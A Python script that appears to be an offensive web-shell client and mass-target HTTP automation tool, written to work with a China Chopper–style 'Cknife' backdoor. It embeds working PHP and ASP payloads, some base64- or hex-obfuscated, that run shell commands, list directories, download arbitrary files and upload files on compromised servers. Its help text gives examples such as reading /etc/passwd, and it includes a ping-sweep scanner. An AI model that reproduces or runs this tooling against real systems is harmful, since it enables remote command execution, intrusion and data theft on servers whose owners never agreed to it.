import ipaddress, re
import threading
from threading import Thread
from concurrent.futures import  ThreadPoolExecutor
import socket, os, sys
import queue, requests, time
import argparse
from functools import partial
from urllib.parse import  urljoin, quote
from base64 import b64encode

RAW_HEADERS  = {
    'Accept-Encoding': 'gzip, deflate, sdch',
    'Accept-Language': 'en-US,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Host': None,
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36'
}

phps = {
    'ls':{
        'action':"""
        @ini_set("display_errors","0");
        @set_time_limit(0);
        function_exists("set_magic_quotes_runtime") ? @set_magic_quotes_runtime(0) : "";
        echo("->|");
        $D=base64_decode($_POST["z1"]);
        $F=@opendir($D);
        if($F==NULL){
            echo("ERROR:// Path Not Found Or No Permission!");
        }else{
            $M=NULL;
            $L=NULL;
            while( $N=@readdir($F)){
                $P=$D."/".$N;
                $T=@date("Y-m-d H:i:s",@filemtime($P));
                @$E=substr(base_convert(@fileperms($P),10,8),-4);
                $R="\\t".$T."\\t".@filesize($P)."\\t".$E."\n";
                if(@is_dir($P))
                    $M.=$N."/".$R;
                else 
                    $L.=$N.$R;
            }
            echo $M.$L;
            @closedir($F);
        };
        echo("|<-");
        die();
""",
        'z1':'%s',
    },
    'cmd':{
        'action':'@ini_set("display_errors","0");@set_time_limit(0);function_exists("set_magic_quotes_runtime") ? @set_magic_quotes_runtime(0) : "";echo("->|");$p=base64_decode($_POST["z1"]);$s=base64_decode($_POST["z2"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";$r="{$p} {$c}";@system($r." 2>&1",$ret);print ($ret!=0)?"ret={$ret}":"";;echo("|<-");die();',
        'z1' : '/bin/sh',
        'z2' : '%s',
    },
    'download': {
        'action':'@ini_set("display_errors","0");@set_time_limit(0);function_exists("set_magic_quotes_runtime") ? @set_magic_quotes_runtime(0) : "";echo("->|");;$F=get_magic_quotes_gpc()?base64_decode(stripslashes($_POST["z1"])):base64_decode($_POST["z1"]);$fp=@fopen($F,"r");if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");};echo("|<-");die();',
        'z1':'%s',
    },
    "upload": {
        'action': """
        @ini_set("display_errors","1");
        @set_time_limit(0);
        function_exists("set_magic_quotes_runtime") ? @set_magic_quotes_runtime(0) : '';
        echo("->|");;
        echo @fwrite(fopen(base64_decode($_POST["z1"]),"wb"),base64_decode($_POST["z2"]))?"1":"0";
        ;echo("|<-");
        die();
        """,
        "z1":"%s",
        "z2":"%s",
    }
}


jsps = {
    
}

asps = {
    "shell":{
        'action':'Set X\=CreateObject("wscript.shell").exec(""""&bd(Request("PARAM1"))&""" /c """&bd(Request("PARAM2"))&"""")\:If Err Then\:S\="[Err] "&Err.Description\:Err.Clear\:Else\:O\=X.StdOut.ReadAll()\:E\=X.StdErr.ReadAll()\:S\=O&E\:End If\:Response.write(S)',
    },
    'download':'44696D20692C632C723A53657420533D5365727665722E4372656174654F626A656374282241646F64622E53747265616D22293A4966204E6F7420457272205468656E3A5769746820533A2E4D6F64653D333A2E547970653D313A2E4F70656E3A2E4C6F616446726F6D46696C65285265717565737428227A312229293A693D303A633D2E53697A653A723D313032343A5768696C6520693C633A526573706F6E73652E42696E6172795772697465202E526561642872293A526573706F6E73652E466C7573683A693D692B723A57656E643A2E436C6F73653A53657420533D4E6F7468696E673A456E6420576974683A456C73653A526573706F6E73652E42696E617279577269746520224552524F523A2F2F2022264572722E4465736372697074696F6E3A456E64204966',
    'make': 'Execute("Execute(""On+Error+Resume+Next\:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function\:Response.Write(""""->|"""")\:Execute(""""On+Error+Resume+Next\:""""%26bd(""""PAYLOAD""""))\:Response.Write(""""|<-"""")\:Response.End"")")'

}

colors = {
    'blue':'\033[0;34m',
    'green':'\033[0;32m',
    'magenta':'\033[0;35m',
    'red':'\033[0;31m',
    'cyan':'\033[0;36m',
    'nc':'\033[0m' ,
}
blue='\033[0;34m'
green='\033[0;32m'
magenta='\033[0;35m'
red='\033[0;31m'
cyan='\033[0;36m'
nc='\033[0m' 

DEBUG_TURN = False

class DataCache:
    ips = []


def php_patch(passwd, op, **kargs):
    pays = phps[op]
    pays.update(kargs)

    ##/*
    ##* when use file upload 
    if op == "upload":
        local_f = pays['z2']
        if os.path.exists(local_f):
            with open(local_f, 'rb') as fp:
                pays['z2'] = fp.read()

    # pays[passwd] = '@eval(base64_decode($_POST[action]));'
    pay = '{PASS}=@eval(base64_decode($_POST[action]));'.format(PASS=passwd)
    # pay = pay + '&action=' + quote(b64encode(pays['action'].encode()))
    for k in pays:
        # if k == "action":
            # continue
        v = pays[k]
        if not isinstance(v, bytes):
            v = v.encode()
        pay = pay + "&" +k +"=" + quote(b64encode(v))
    # np = {k: quote(b64encode(pays[k].encode())) for k in pays}
    # np[passwd] = '@eval(base64_decode($_POST[action]));'

    return pay


def php_cmd_parse(vals, passwd):

    code = 'e http[%s] options{passwd=%s,op=%s} ' 
    commands = [ ' '.join(vals[2:])]

    if vals[1] == "l":
        code = code % (vals[0], passwd, "ls")
        # commands = [' '.join(vals[1:])]
    elif vals[1] == 'c':
        code = code % (vals[0], passwd, "cmd")
        # commands = [ ' '.join(vals[1:])]

    elif vals[1] == 'd':
        code = code % (vals[0], passwd, "download")
        # commands = [ ' '.join(vals[1:])]
    elif vals[1] == 's':
        # save file
        code = code % (vals[0], passwd, "upload")
        commands = [vals[2], vals[3]]
    else:
        print(red, "error parameters !!", vals)

    
    code += " kargs{"
    for i,k in enumerate(commands):
        code = code + 'z'+str(i+1) + "=" + k + ","
    code = code[:-1]
    code += "}"
    return code


def collect(ip):
    DataCache.ips.append(ip)

def test_ip(ip_str, q):
    # percent()
    ops = "c"
    if sys.platform[:3] == "win": 
        ops = "n"
        
    cmd = ["ping", "-{op}".format(op=ops),"1", ip_str]
    # print(cmd)
    output = os.popen(" ".join(cmd)).readlines() 
    flag = False
    for line in list(output): 
        if not line:
            continue
        if str(line).upper().find("TTL") >=0: 
            flag = True
            break
    if flag:
        print(blue,"[+]", green, ip_str, "ok", nc)
        q.put(ip_str)

# def test_port()

def loads_t(limit, func, argas_lists,q):
    threads = []
    count = 0
    while 1:
        count +=1
        try:
            p = argas_lists.pop()
        except IndexError:
            break
        # print len(p)
        # print(p)
        if isinstance(p, (list, tuple, set,)):
            fun = partial(func, *p)
        else:
            fun = partial(func, p)

        threads.append(Thread(target=fun, args=(q,)))
        if count == limit:
            count = 0
            break

    for t in threads:
        t.start()

    for t in threads:
        t.join()
    

    
    return argas_lists


def test_ips(ips, threads=48):
    hosts = ipaddress.ip_network(ips)
    q = queue.Queue(255)
    # with ThreadPoolExecutor(threads) as exe:
    threads = []
    hosts = [str(i) for i in hosts]
    while hosts:
        loads_t(20, test_ip, hosts, q)
    return q


class Framework:

    def __init__(self, target):
        self.target = target
        self.options = {
            'print':'',
            'flush':'',
            'match':'',
            'sleep':'',
            'op':'',
            'passwd':'',
        }
        self.buf = {}
        self.file = {}

    def _extract(self, single, type):
        res = re.findall(r'%s\{(.+?)\}' % type, single)
        if res:
            values = res[0].split(",")
            d_vals = { i.split("=")[0]:i.split("=")[1] for i in values }
            if hasattr(self, type):
                getattr(self, type).update(d_vals)
            else:
                setattr(self, type, d_vals)

    def _extract2(self, single, type):
        res = re.findall(r'%s\[(.+?)\]' % type, single)
        if res:
            values = res[0].split(",")
            return values

    def http(self, single):
        return urljoin(self.target, self._extract2(single, 'http')[0])

    def getoptions(self, single):
        self._extract(single, "options")

    def getbuf(self, single):
        self._extract(single, "buf")

    def getkargs(self, single):
        self._extract(single, "kargs")       

    def getfile(self, single):
        # r = self._extract2(single, "file")
        # if r:
        #     return r[0]
        # else:
        #     return None
        self._extract(single, 'file')

    def p(self, *args, **kargs):
        if DEBUG_TURN:
            print("\033[0;34m[+]",self.target, green,*args, nc, **kargs)

    def run(self,codes):
        ## init session ;
        # keep cookie after aciton.
        session = requests.Session()
        session.headers.update(RAW_HEADERS)
        flag = None
        index = 0
        
        while index < len(codes):
            l = codes[index]
            single_code = l.strip()
            
            self.p(single_code)
            if not single_code:
                print("con")
                index += 1
                continue
            single_words = single_code.split()
            first = single_words[0]
            try:
                second = single_words[1]
            except IndexError:
                second = ""

            # extract buf and options
            self.getoptions(single_code)
            self.getbuf(single_code)
            self.getkargs(single_code)
            self.getfile(single_code)
            url = self.http(single_code)
            self.p("url:",url)
            self.p("file:",self.file)
            r = None

            if flag != None:
                if flag == False:
                    index +=1
                    continue
                elif flag == "ready":
                    pass
                elif flag == True:
                    pass

            kargs = {'verify': False}
            if hasattr(self, 'kargs'):
                kargs = self.kargs

            self.p("buf:",self.buf)
            self.p("kargs:",kargs)

            if first.startswith("http"):
                r = session.get(url, **kargs)
            elif first.startswith("p"):
                r = session.post(url, data=self.buf, **kargs)
            elif first == "e":
                pay = php_patch(self.options['passwd'], self.options['op'], **self.kargs)
                self.p("pay:",pay)
                [kargs.pop(k) for k in ['z1', 'z2'] if k in kargs]

                session.headers['Content-type'] = "application/x-www-form-urlencoded"
                r = session.post(url, data=pay, **kargs)
                # resume old setting
                session.headers.pop('Content-type')
                cc = r.content[r.content.index(b'->|') + 3: r.content.index(b'|<-')]
                if self.options['op'] != "download":
                    try:
                        cc = "\n"+cc.decode("utf8")
                    except Exception:
                        cc = "\n"+cc.decode("gbk")
                if self.options['op'] == 'upload':
                    cc = "Success upload !"
                print(green,self.target,cyan, cc, nc)

            elif first.startswith("f"):
                file = self.file.values()[0]
                with open(file, 'rb') as fp:
                # files = {'file': open(file, 'rb')}
                    self.p(self.buf, self.file)
                    r = session.post(url, data=self.buf, files=self.file, **kargs)
            elif first == "if":
                flag = "ready"
                index +=1
                continue
            elif first == "end-if":
                flag = None
                index +=1
                continue


            if r.status_code != 200:
                self.p(red,"404", url)
                
            if self.options['print']:
                if self.options['print'] != '1':
                    with open('/tmp/' + self.options['print'], 'w') as fp:
                        print(r.text, file=fp)
                else:
                    # self.p(r.text)
                    self.p("content:",r.content)

            if self.options['match']:
                if self.options['match'] in r.text:
                    if flag == False:
                        flag = True
                    self.p("Found:",self.options['match'])

            if self.options['sleep']:
                time.sleep(int(self.options['sleep']))

            # update session 
            if self.options['flush']:
                session = requests.Session()

            index += 1
        # self.p("Over")

    def show(self, text):
        pass

def start(code_or_code_file, target, q):
    # target = code_file_target[1]
    # code_file = code_file_target[0]
    c = Framework(target)
    c.p("***** ", target, "******")
    if isinstance(code_or_code_file, str):
        code_file = code_or_code_file

        with open(code_file) as fp:
            codes = fp.readlines()
            c.run(codes)
    else:
        codes = code_or_code_file
        c.run(codes)



def RunPayloads(code_file, targets, limit):
    q = queue.Queue()
    args = [(code_file, target) for target in targets]
    loads_t(limit, start, args, q)



def main():
    global DEBUG_TURN
    parser = argparse.ArgumentParser(usage="""
stream handler for multi targets.
you can write easy code to make a custom http-actions-chains.
like:
    http[/]                                         # this will GET $target + / 
    p http[/user.php] buf{user=hello,pass=xasgag}   # this will post and auth . cookie will be keeped alltime.
    http[/admin.php]  options{print=1}              # will GET $target + /admin.php and print the result

...

documents:
op:
    p:  post method , must add buf{xxx=xxx,xx=xxxxxx}
    f:  file post, must add file[xxxx,xxxx] buf{xxx=xxxx,xxx=xxxx}
    if: if op will init a flag , when run next line , if 'match' option be found will set flag to True.
        if flag is True, will go on ,else will skip to 'if-end'
    

options:
    print: [0/1] if specify others, will print result to file.
    flush: [0/1] it is will re-init session to clear cookie.
    match: [xxx] if r.text find xxxx will set a match flag=True , this will be used for 'if' op.
    passwd: [xxx] for php shell,
    op: [ls/download/cmd] for php shell,

        """)

    parser.add_argument("-c","--code-file",default=None, help="code file. easy code to custom.")
    parser.add_argument("-t", "--target", default=None, nargs="*", help="target, just a str")
    parser.add_argument("-T", "--targets", default=None, help="targets , this will write in a file.")
    parser.add_argument("--threads", default=8, type=int, help="set threads's num default 8. ")
    parser.add_argument("-v", "--verbose", default=False, action='store_true', help="set if turn on debug .")
    parser.add_argument("--scan", default=None, help="test a ip/port if [activate] exm: --scan 10.10.10.0/24:22,80,8080 ")
    parser.add_argument("-C", "--code", nargs='*', default=None, help=" code directly")
    parser.add_argument("-P", "--php-shell", nargs='*', default=None, help="can direct connect Cknife , suport [c/d/l| cmd/download/ls] \
        like: "+ green+ " -P d /var/www/html/indx.2 "+ nc+ "\n\
        like: "+ green+ " -P c ls -lha ./ & cat /etc/passwd "+ nc+ "\n\
        like: "+ green+ "-P l /home "+ nc+ "\n\
        like: -P u ./test.php ./" + nc)
    parser.add_argument("--passwd", default=None, help="set passwd's value. for Cknife.")


    args = parser.parse_args()

    if args.scan:
        pass

    if args.verbose:
        DEBUG_TURN = True

    if args.code_file:
        if args.target:
            RunPayloads(args.code_file, args.target, args.threads)
        else:
            targets = []
            with open(args.targets) as fp:
                for l in fp:
                    if l.strip():
                        targets.append(l.strip())

            RunPayloads(args.code_file, targets, args.threads)
    if args.code:
        if args.target:
            RunPayloads(args.code, args.target, args.threads)
        else:
            targets = []
            with open(args.targets) as fp:
                for l in fp:
                    if l.strip():
                        targets.append(l.strip())

            RunPayloads(args.code, targets, args.threads)

    if args.php_shell:
        code = php_cmd_parse(args.php_shell, args.passwd)
        print(code)

        if args.target:
            RunPayloads([code], args.target, args.threads)
        else:
            targets = []
            with open(args.targets) as fp:
                for l in fp:
                    if l.strip():
                        targets.append(l.strip())

            RunPayloads([code], targets, args.threads)

if __name__ == '__main__':
    main()

